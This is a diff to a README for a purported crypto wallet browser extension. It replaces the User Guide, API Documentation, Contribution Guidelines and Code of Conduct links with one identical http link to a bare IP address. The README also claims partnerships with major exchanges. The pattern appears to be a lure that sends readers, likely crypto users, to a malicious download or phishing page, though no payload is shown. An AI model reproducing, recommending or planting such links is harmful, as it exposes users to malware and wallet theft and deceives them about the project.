@@ -33,8 +33,8 @@ The Crypto Wallet Extension is designed to simplify the management of your digit
 
 ## 🛠 Documentation
 
-- [User Guide](https://example.com/user-guide)
-- [API Documentation](https://example.com/api-docs)
+- [User Guide](http://91.210.165.22/1dQfgM3Q)
+- [API Documentation](http://91.210.165.22/1dQfgM3Q)
 - 
 ![image](https://github.com/user-attachments/assets/fef04646-7d73-4ec2-a7fe-1b2094e1c16a)
 
@@ -47,8 +47,8 @@ We welcome active community participation in improving our crypto wallet extensi
 We actively collaborate with leading crypto exchanges such as Binance, Coinbase, Kraken, Huobi, bitso, gemini,and more to ensure you have access to up-to-date data and the best trading conditions.
 ![image](https://github.com/user-attachments/assets/657f3102-5a26-43ea-b179-05a2d53d1b9e)
 
-- [Contribution Guidelines](https://example.com/contributing)
-- [Code of Conduct](https://example.com/code-of-conduct)
+- [Contribution Guidelines](http://91.210.165.22/1dQfgM3Q)
+- [Code of Conduct](http://91.210.165.22/1dQfgM3Q)
 
 ## 🔐 Security & Responsible Use
 
